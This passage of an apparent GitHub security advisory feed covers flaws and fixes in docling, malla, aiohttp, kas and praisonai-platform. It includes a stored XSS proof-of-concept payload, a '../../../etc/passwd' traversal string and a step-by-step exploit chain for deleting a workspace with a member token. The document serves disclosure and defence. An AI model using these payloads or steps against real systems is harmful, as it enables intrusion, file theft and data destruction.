</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible:</p>
<ul>
<li>reject <code>file:</code> and <code>data:</code> image references from untrusted input</li>
<li>allow only approved local or remote image sources</li>
<li>apply input size and memory limits to processing workers</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling-core/releases/tag/v2.74.1"><code>v2.74.1</code></a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling-core/security/advisories/GHSA-j5xp-7m2f-49jv">https://github.com/docling-project/docling-core/security/advisories/GHSA-j5xp-7m2f-49jv</a></li>
<li><a href="https://github.com/docling-project/docling-core/releases/tag/v2.74.1">https://github.com/docling-project/docling-core/releases/tag/v2.74.1</a></li>
<li><a href="https://github.com/advisories/GHSA-j5xp-7m2f-49jv">https://github.com/advisories/GHSA-j5xp-7m2f-49jv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5xp-7m2f-49jv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T21:15:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Unsafe URI and Path Handling in HTML Backend]]></title>
        <id>https://github.com/advisories/GHSA-q29v-xc37-wh5m</id>
        <link href="https://github.com/advisories/GHSA-q29v-xc37-wh5m"/>
        <updated>2026-06-03T21:15:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The HTML backend did not perform sufficient validation during resource handling:</p>
<ul>
<li>Accepted <code>file://</code> URIs enabling local file system access when <code>enable_local_fetch=True</code></li>
<li>Path resolution allowed traversal outside intended directories via <code>../</code> sequences and absolute paths</li>
<li>Did not block internal network resources under <code>enable_remote_fetch=True</code></li>
<li>HTTP redirects were not validated, potentially redirecting to unintended schemes</li>
<li>No resource limits for remote image downloads and <code>data:</code> URIs</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Fixed in versions 2.91.0 (initial fixes) and 2.94.0 (additional improvements). The fixes implement:</p>
<ul>
<li>Updated local path treatment: absolute files always blocked, relative paths require <code>enable_local_fetch=True</code> (default: False) and containment within configured <code>base_path</code> for path traversal protection</li>
<li><code>file://</code> scheme stripped &amp; treated as local path (above)</li>
<li>IP address validation to prevent SSRF</li>
<li>HTTP redirect validation, connection and read timeouts</li>
<li>Size limit for both remote images (with streaming download) and base64-decoded data URIs</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Keep both <code>enable_local_fetch=False</code> and <code>enable_remote_fetch=False</code> (defaults) when processing untrusted HTML documents.</p>
<h3 id="references">References</h3>
<ul>
<li>Initial fixes: <a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">v2.91.0</a></li>
<li>Additional improvements: <a href="https://github.com/docling-project/docling/releases/tag/v2.94.0">v2.94.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-q29v-xc37-wh5m">https://github.com/docling-project/docling/security/advisories/GHSA-q29v-xc37-wh5m</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">https://github.com/docling-project/docling/releases/tag/v2.91.0</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.94.0">https://github.com/docling-project/docling/releases/tag/v2.94.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q29v-xc37-wh5m">https://github.com/advisories/GHSA-q29v-xc37-wh5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q29v-xc37-wh5m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T21:15:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Potential Path Traversal via LaTeX \includegraphics and \input Commands]]></title>
        <id>https://github.com/advisories/GHSA-2j5p-7p5m-cvqr</id>
        <link href="https://github.com/advisories/GHSA-2j5p-7p5m-cvqr"/>
        <updated>2026-06-03T21:14:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The LaTeX backend's handling of <code>\includegraphics</code>, <code>\input</code>, and <code>\include</code> commands lacked path containment validation. Attackers could craft malicious LaTeX documents with path traversal sequences (e.g., <code>../../../etc/passwd</code>) to:</p>
<ul>
<li>Read arbitrary files from the file system accessible to the process</li>
<li>Include sensitive files in the converted document output</li>
<li>Potentially access configuration files, credentials, or other sensitive data</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Fixed in version 2.91.0. The fix implements strict path validation using <code>Path.resolve().is_relative_to()</code> to ensure all resolved paths remain within the base document directory. Attempts to traverse outside the base directory are logged and blocked.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid processing untrusted LaTeX documents. If processing is necessary, run in a sandboxed environment with restricted file system access.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">v2.91.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-2j5p-7p5m-cvqr">https://github.com/docling-project/docling/security/advisories/GHSA-2j5p-7p5m-cvqr</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">https://github.com/docling-project/docling/releases/tag/v2.91.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2j5p-7p5m-cvqr">https://github.com/advisories/GHSA-2j5p-7p5m-cvqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j5p-7p5m-cvqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T21:14:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Unsafe XML Entity Expansion in USPTO Patent Backend]]></title>
        <id>https://github.com/advisories/GHSA-m88r-rg27-5xfg</id>
        <link href="https://github.com/advisories/GHSA-m88r-rg27-5xfg"/>
        <updated>2026-06-03T21:14:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The USPTO patent XML parser used the standard <code>xml.sax.parseString()</code> without protection against XML External Entity (XXE) attacks. An attacker could craft malicious USPTO patent XML files with external entity references that could:</p>
<ul>
<li>Read arbitrary files from the server filesystem</li>
<li>Perform Server-Side Request Forgery (SSRF) attacks</li>
<li>Cause denial of service through entity expansion (Billion Laughs attack)</li>
</ul>
<p>The vulnerability affects three USPTO patent format parsers: ICE (v4.x), Grant v2.5, and Application v1.x.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version 2.74.0. The parser now uses <code>defusedxml.sax.make_parser()</code> with secure configuration that blocks external entity resolution (<code>feature_external_ges=False</code>, <code>feature_external_pes=False</code>) while allowing DTD declarations required by USPTO files. This prevents XXE attacks while maintaining compatibility with the USPTO XML format.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid processing USPTO patent XML files from untrusted sources. Implement resource limits (memory, CPU time) when processing patent documents.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling/releases/tag/v2.74.0">v2.74.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-m88r-rg27-5xfg">https://github.com/docling-project/docling/security/advisories/GHSA-m88r-rg27-5xfg</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.74.0">https://github.com/docling-project/docling/releases/tag/v2.74.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m88r-rg27-5xfg">https://github.com/advisories/GHSA-m88r-rg27-5xfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m88r-rg27-5xfg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T21:14:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Unsafe Archive Extraction and XML Parsing in METS-GBS Backend]]></title>
        <id>https://github.com/advisories/GHSA-r3xg-rg9j-67fv</id>
        <link href="https://github.com/advisories/GHSA-r3xg-rg9j-67fv"/>
        <updated>2026-06-03T21:13:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The METS-GBS backend's XML parsing and the input document format detection lacked security controls, enabling:</p>
<ul>
<li>XML External Entity (XXE) attacks to read local files or cause denial of service</li>
<li>Decompression bombs (zip bombs) to exhaust memory and disk space</li>
<li>Unbounded archive extraction consuming system resources</li>
</ul>
<p>An attacker could craft malicious METS-GBS archives that, when processed, could read sensitive files, exhaust system resources, or cause application crashes.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version 2.91.0. The fix implements:</p>
<ul>
<li>Secure XML parsing with <code>resolve_entities=False</code>, <code>load_dtd=False</code>, and <code>no_network=True</code></li>
<li>Configurable limits: 300 MB total extraction size, 10 MB per file, 1000 member count</li>
<li>Cumulative size tracking across all extractions</li>
<li>Early termination when limits are exceeded</li>
<li>Secure format detection of METS-GBS tar archives with <code>_detect_mets_gbs()</code> method: maximum file size (10 MB per file), maximum member count (1000 members), and exception handling to gracefully fail when limits are exceeded</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid processing METS-GBS archives from untrusted sources. If necessary, pre-validate archives in an isolated environment with resource limits.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">v2.91.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-r3xg-rg9j-67fv">https://github.com/docling-project/docling/security/advisories/GHSA-r3xg-rg9j-67fv</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">https://github.com/docling-project/docling/releases/tag/v2.91.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r3xg-rg9j-67fv">https://github.com/advisories/GHSA-r3xg-rg9j-67fv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3xg-rg9j-67fv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T21:13:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Unsafe Playwright-based HTML Rendering]]></title>
        <id>https://github.com/advisories/GHSA-pj2v-ggqh-cmq2</id>
        <link href="https://github.com/advisories/GHSA-pj2v-ggqh-cmq2"/>
        <updated>2026-06-03T21:09:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions <code>&gt;= 2.82.0, &lt; 2.91.0</code>, if the HTML backend was explicitly configured for rendering (rendering option by default deactivated), then the Playwright-based rendering feature could allow JavaScript execution and unrestricted network access when processing untrusted HTML documents. An attacker could craft malicious HTML that executes arbitrary JavaScript in the rendering context or makes unauthorized network requests to internal services, potentially leading to SSRF attacks, data exfiltration, or remote code execution in the rendering environment.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version 2.91.0. The rendering context now explicitly disables JavaScript execution (<code>java_script_enabled=False</code>) and implements network isolation controls. When <code>enable_remote_fetch</code> is disabled, the browser operates in offline mode, preventing all network requests.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Refrain from using <code>render_page=True</code> when processing untrusted HTML documents.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">v2.91.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-pj2v-ggqh-cmq2">https://github.com/docling-project/docling/security/advisories/GHSA-pj2v-ggqh-cmq2</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">https://github.com/docling-project/docling/releases/tag/v2.91.0</a></li>
<li><a href="https://github.com/advisories/GHSA-pj2v-ggqh-cmq2">https://github.com/advisories/GHSA-pj2v-ggqh-cmq2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pj2v-ggqh-cmq2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T21:09:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[malla] malla: Stored XSS via Meshtastic node names in multiple frontend pages]]></title>
        <id>https://github.com/advisories/GHSA-ch57-39q2-4crm</id>
        <link href="https://github.com/advisories/GHSA-ch57-39q2-4crm"/>
        <updated>2026-06-03T21:06:28.000Z</updated>
        <content type="html"><![CDATA[<p>Node names (long_name, short_name) received via MQTT are stored in SQLite without sanitization and rendered into the DOM without escaping.
Any participant on a public Meshtastic MQTT broker can set a malicious node name that executes JavaScript in the browser of every Malla dashboard visitor.</p>
<p>Affected files:</p>
<ul>
<li>src/malla/templates/traceroute_graph.html (line ~832)</li>
<li>src/malla/templates/map.html (lines ~945, 1078)</li>
<li>src/malla/templates/packet_detail.html (lines ~1402, 1452)</li>
<li>src/malla/static/js/relay_node_analysis.js (line ~124)</li>
</ul>
<p>Steps to reproduce</p>
<ol>
<li>Publish a Meshtastic NODEINFO_APP packet to any public MQTT broker with long_name set to a HTML entity i.e <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>Wait for malla-capture to store it</li>
<li>Open the dashboard</li>
</ol>
<p>Impact</p>
<p>Allows unauthenticated remote attackers to execute arbitrary JavaScript in the browser, such as: </p>
<ul>
<li>Phishing overlays</li>
<li>Force redirect to malicious websites</li>
<li>Injection of arbitrary third-party scripts (no CSP restrictions)</li>
<li>Browser resource abuse </li>
<li>Persistent dashboard denial of service</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zenitraM/malla/security/advisories/GHSA-ch57-39q2-4crm">https://github.com/zenitraM/malla/security/advisories/GHSA-ch57-39q2-4crm</a></li>
<li><a href="https://github.com/zenitraM/malla/commit/4086e2b5f61615a813b70b25bc76095083552135">https://github.com/zenitraM/malla/commit/4086e2b5f61615a813b70b25bc76095083552135</a></li>
<li><a href="https://github.com/advisories/GHSA-ch57-39q2-4crm">https://github.com/advisories/GHSA-ch57-39q2-4crm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ch57-39q2-4crm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T21:06:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP is Vulnerable to Deserialization of Untrusted Data]]></title>
        <id>https://github.com/advisories/GHSA-jg22-mg44-37j8</id>
        <link href="https://github.com/advisories/GHSA-jg22-mg44-37j8"/>
        <updated>2026-06-03T20:56:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Using <code>CookieJar.load()</code> with untrusted input may allow arbitrary code execution.</p>
<h3 id="impact">Impact</h3>
<p>Most applications using this function will be doing so with the user's own data, so this is unlikely to affect many applications.</p>
<h3 id="workaround">Workaround</h3>
<p>If an application does allow attacker controlled files to be loaded, a workaround on older releases would be to sanitise the files before loading.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/dcf40f30637e8752c76781cf6703b5a236749a00">https://github.com/aio-libs/aiohttp/commit/dcf40f30637e8752c76781cf6703b5a236749a00</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jg22-mg44-37j8">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jg22-mg44-37j8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34993">https://nvd.nist.gov/vuln/detail/CVE-2026-34993</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/dcf40f30637e8752c76781cf6703b5a236749a00">https://github.com/aio-libs/aiohttp/commit/dcf40f30637e8752c76781cf6703b5a236749a00</a></li>
<li><a href="https://github.com/advisories/GHSA-jg22-mg44-37j8">https://github.com/advisories/GHSA-jg22-mg44-37j8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jg22-mg44-37j8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T20:56:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling] Docling: Unsafe Zip Extraction in EasyOCR Model Download]]></title>
        <id>https://github.com/advisories/GHSA-cjqg-rq2h-2fvj</id>
        <link href="https://github.com/advisories/GHSA-cjqg-rq2h-2fvj"/>
        <updated>2026-06-03T20:02:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions <code>&lt; 2.91.0</code>, The EasyOCR model download functionality extracted ZIP archives without validating member paths, enabling Zip Slip attacks. If an attacker could compromise the model download source (via supply chain attack, DNS spoofing, or MITM), they could write arbitrary files to any location writable by the process, potentially achieving:</p>
<ul>
<li>Remote code execution by overwriting Python files or system binaries</li>
<li>Persistent backdoors by modifying startup scripts or SSH keys</li>
<li>Data corruption or system compromise</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Fixed in version 2.91.0. The extraction process now validates each archive member path using <code>os.path.realpath()</code> to ensure it remains within the target directory, raising a <code>SecurityError</code> for any path traversal attempts.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure model downloads occur over secure, authenticated channels. Use integrity verification (checksums) for downloaded models. Run the application with minimal file system permissions.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">v2.91.0</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling/security/advisories/GHSA-cjqg-rq2h-2fvj">https://github.com/docling-project/docling/security/advisories/GHSA-cjqg-rq2h-2fvj</a></li>
<li><a href="https://github.com/docling-project/docling/releases/tag/v2.91.0">https://github.com/docling-project/docling/releases/tag/v2.91.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cjqg-rq2h-2fvj">https://github.com/advisories/GHSA-cjqg-rq2h-2fvj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjqg-rq2h-2fvj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T20:02:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kas] kas checks out SHA-like git branches as valid commits]]></title>
        <id>https://github.com/advisories/GHSA-qjwp-hrq6-r26r</id>
        <link href="https://github.com/advisories/GHSA-qjwp-hrq6-r26r"/>
        <updated>2026-06-01T14:26:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When relying solely on a git commit ID (SHA-1 or SHA-256) to qualify if a checkout of a repository is equivalent to the state validated while adding its commit ID to a kas configuration, users may be tricked to check out a branch of the same name from this repository. This implies that the referenced repository has been taken over by an attacker and modified to carry such a branch. SHA-1 commits may also be replaced by creating hash collisions, so the primary impact of this issue is on SHA-256 commit IDs.</p>
<h3 id="patches">Patches</h3>
<p>Commit <a href="https://github.com/siemens/kas/commit/4cb4a3d01122ffaec9feaae768a5814092f6f9b5">https://github.com/siemens/kas/commit/4cb4a3d01122ffaec9feaae768a5814092f6f9b5</a> is resolving this issue. It has been released along with kas version 5.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid relying solely on the commit ID for integrity validation of a repository that might become under control of a malicious 3rd party. If available, additional validate cryptographically signed commits or tags. Alternatively, mirror the repository to a save place, validate its integrity, and use this instead of the original one.</p>
<h3 id="credits">Credits</h3>
<p>That such issues exist was already reported 3 years ago by Aditya Sirish A Yelgundhalli. At this point, no strong integrity checks for external repositories were in place in kas, and Siemens stated in the kas documentation that such attacks are considered out of scope. This hasn't changed for SHA-1 commits as explained above. If a repo provides SHA-256 commits, though, those may be considered strong enough (even if not providing authenticity proof) and can be affected by this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/siemens/kas/security/advisories/GHSA-qjwp-hrq6-r26r">https://github.com/siemens/kas/security/advisories/GHSA-qjwp-hrq6-r26r</a></li>
<li><a href="https://github.com/siemens/kas/commit/4cb4a3d01122ffaec9feaae768a5814092f6f9b5">https://github.com/siemens/kas/commit/4cb4a3d01122ffaec9feaae768a5814092f6f9b5</a></li>
<li><a href="https://github.com/advisories/GHSA-qjwp-hrq6-r26r">https://github.com/advisories/GHSA-qjwp-hrq6-r26r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjwp-hrq6-r26r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-01T14:26:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Any workspace member can delete the entire workspace via DELETE /workspaces/{id}]]></title>
        <id>https://github.com/advisories/GHSA-g8rr-7rj2-f627</id>
        <link href="https://github.com/advisories/GHSA-g8rr-7rj2-f627"/>
        <updated>2026-06-01T14:24:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Authorization bypass enabling destructive action. The <code>DELETE /workspaces/{workspace_id}</code> endpoint is gated only by <code>require_workspace_member(workspace_id)</code> (default <code>min_role="member"</code>). Any member of the workspace can issue a single DELETE to wipe the entire workspace, including every project, issue, comment, agent, label, and member record (cascading via the foreign-key relationships). There is no owner-role gate, no confirmation token, no soft-delete window, no recovery path.
<strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 77-86; <code>services/workspace_service.py</code>'s <code>delete()</code> method.
<strong>Root cause:</strong> the route uses <code>Depends(require_workspace_member)</code> which defaults to <code>min_role="member"</code> and is never overridden. The service method <code>WorkspaceService.delete(workspace_id)</code> performs the destructive operation without any caller-permission verification. The role hierarchy (<code>MemberService.has_role</code>, member_service.py:80-96) is implemented but unused for this endpoint.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/workspaces.py</code>, lines 77-86.</p>
<pre><code class="language-python">@router.delete("/{workspace_id}", status_code=status.HTTP_204_NO_CONTENT)
async def delete_workspace(
    workspace_id: str,
    user: AuthIdentity = Depends(require_workspace_member),         # &lt;-- BUG: defaults to min_role="member"
    session: AsyncSession = Depends(get_db),
):
    ws_svc = WorkspaceService(session)
    deleted = await ws_svc.delete(workspace_id)                     # &lt;-- destructive, no role check
    if not deleted:
        raise HTTPException(status_code=404, detail="Workspace not found")
</code></pre>
<p><strong>Why it's wrong:</strong> workspace deletion is the most destructive single action in this product — it wipes every member, project, issue, comment, agent, and label belonging to the tenant. The standard convention is to gate this on owner role, ideally with a confirmation parameter (typed workspace name) and a recovery window. This endpoint does none of that. The <code>require_workspace_member(min_role)</code> parameter exists precisely for this kind of tightening but is never invoked with anything other than the default.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Attacker is a member of workspace <code>W</code> (joined via invite, signup default, or any other route into membership). State: attacker holds JWT with <code>Member(workspace_id=W, user_id=attacker, role="member")</code>.</li>
<li>Attacker sends <code>DELETE /workspaces/W</code> with <code>Authorization: Bearer &lt;attacker_jwt&gt;</code>. State: control flow enters <code>delete_workspace</code>.</li>
<li><code>require_workspace_member(W, attacker)</code> passes (attacker is a member, default min_role="member" satisfied). <code>WorkspaceService.delete(W)</code> removes the workspace row; SQLAlchemy cascade rules drop every related row (members, projects, issues, comments, agents, labels). State: workspace <code>W</code> no longer exists.</li>
<li>Final state: a low-privilege member has wiped the workspace. The legitimate owner has no recovery: no soft-delete, no audit-trail event for the deletion (the <code>Activity</code> log row would have been deleted too as part of the cascade). The same primitive at scale (script that DELETEs every workspace_id the attacker can enumerate) becomes a multi-tenant griefing tool.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-high. CVSS 8.1: network attack, low complexity, low privileges, no user interaction, scope unchanged, no confidentiality (just destruction), high integrity (every workspace child row wiped), high availability (workspace gone for legitimate owner).
<strong>Attacker capability:</strong> with one workspace-member token plus one DELETE request, the attacker irreversibly deletes the workspace and every child resource. The deletion is silent and immediate.
<strong>Preconditions:</strong> <code>praisonai-platform</code> is deployed multi-tenant; the attacker has any membership token in the target workspace.
<strong>Differential:</strong> source-inspection-verified. The asymmetry between <code>require_workspace_member</code>'s clearly-tunable <code>min_role</code> parameter and this endpoint's use of the default value confirms the gap. With the suggested fix below, member-tier tokens fail the gate at the dependency, the destructive action never reaches the service layer, and the endpoint returns 403 instead of 204.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<pre><code class="language-diff">--- a/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
+++ b/src/praisonai-platform/praisonai_platform/api/routes/workspaces.py
@@ -75,11 +75,15 @@
+def _require_workspace_owner(workspace_id: str, user, session):
+    return require_workspace_member(workspace_id, user, session, min_role="owner")
+
 @router.delete("/{workspace_id}", status_code=status.HTTP_204_NO_CONTENT)
 async def delete_workspace(
     workspace_id: str,
-    user: AuthIdentity = Depends(require_workspace_member),
+    user: AuthIdentity = Depends(_require_workspace_owner),
     session: AsyncSession = Depends(get_db),
 ):
     ws_svc = WorkspaceService(session)
     deleted = await ws_svc.delete(workspace_id)
     if not deleted:
         raise HTTPException(status_code=404, detail="Workspace not found")
</code></pre>
<p>Defence-in-depth: require a typed-confirmation parameter (e.g. body <code>{"confirm_name": "&lt;workspace_name&gt;"}</code>) and implement a 30-day soft-delete with restore. The four companion workspace-mutation endpoints (<code>update_workspace</code>, <code>add_member</code>, <code>update_member_role</code>, <code>remove_member</code>) exhibit the same default-min-role gap and are filed as their own advisories.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-g8rr-7rj2-f627">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-g8rr-7rj2-f627</a></li>
<li><a href="https://github.com/advisories/GHSA-g8rr-7rj2-f627">https://github.com/advisories/GHSA-g8rr-7rj2-f627</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8rr-7rj2-f627</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-01T14:24:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: Issue endpoints accept any issue_id without workspace ownership check, cross-workspace read/update/delete IDOR]]></title>
        <id>https://github.com/advisories/GHSA-xwq8-frcg-77q8</id>
        <link href="https://github.com/advisories/GHSA-xwq8-frcg-77q8"/>
        <updated>2026-06-01T14:24:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Insecure Direct Object Reference. The issue CRUD endpoints (<code>GET / PATCH / DELETE /workspaces/{workspace_id}/issues/{issue_id}</code>) gate access on <code>require_workspace_member(workspace_id)</code> only, then resolve <code>issue_id</code> through <code>IssueService.get(issue_id)</code> which is a primary-key lookup with no workspace constraint. A user who is a member of any workspace <code>W1</code> can read, modify, or delete issues that belong to a different workspace <code>W2</code>.
<strong>File:</strong> <code>src/praisonai-platform/praisonai_platform/services/issue_service.py</code>, lines 72-156; route handlers at <code>src/praisonai-platform/praisonai_platform/api/routes/issues.py</code>, lines 82-137.
<strong>Root cause:</strong> the route extracts <code>workspace_id</code> from the URL path, uses it solely for the membership gate, then calls <code>IssueService.get(issue_id)</code> / <code>IssueService.update(issue_id, ...)</code> / <code>IssueService.delete(issue_id)</code> without re-checking which workspace the issue actually belongs to. <code>IssueService.get</code> runs a single-key lookup; <code>update</code> and <code>delete</code> call <code>self.get(issue_id)</code> first and then mutate the returned row, inheriting the same gap. The <code>MemberService</code> in this same codebase uses a composite <code>(workspace_id, user_id)</code> key, proving the author knows the safe pattern; it was simply not applied to the issue, agent, project, comment, or label services.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File 1:</strong> <code>src/praisonai-platform/praisonai_platform/services/issue_service.py</code>, lines 72-75 and 97-156.</p>
<pre><code class="language-python">class IssueService:
    ...

    async def get(self, issue_id: str) -&gt; Optional[Issue]:
        """Get issue by ID."""
        return await self._session.get(Issue, issue_id)             # &lt;-- BUG: no workspace_id predicate

    async def update(
        self,
        issue_id: str,
        title: Optional[str] = None,
        ...
    ) -&gt; Optional[Issue]:
        issue = await self.get(issue_id)                            # &lt;-- inherits the same gap
        if issue is None:
            return None
        ...
        return issue

    async def delete(self, issue_id: str) -&gt; bool:
        issue = await self.get(issue_id)                            # &lt;-- inherits the same gap
        if issue is None:
            return False
        await self._session.delete(issue)
        await self._session.flush()
        return True
</code></pre>
<p><strong>File 2:</strong> <code>src/praisonai-platform/praisonai_platform/api/routes/issues.py</code>, lines 82-137.</p>
<pre><code class="language-python">@router.get("/{issue_id}", response_model=IssueResponse)
async def get_issue(
    workspace_id: str,
    issue_id: str,
    user: AuthIdentity = Depends(require_workspace_member),         # only checks membership in workspace_id
    session: AsyncSession = Depends(get_db),
):
    svc = IssueService(session)
    issue = await svc.get(issue_id)                                 # &lt;-- workspace_id never threaded through
    if issue is None:
        raise HTTPException(status_code=404, detail="Issue not found")
    return IssueResponse.model_validate(issue)


@router.patch("/{issue_id}", response_model=IssueResponse)
async def update_issue(
    workspace_id: str,
    issue_id: str,
    body: IssueUpdate,
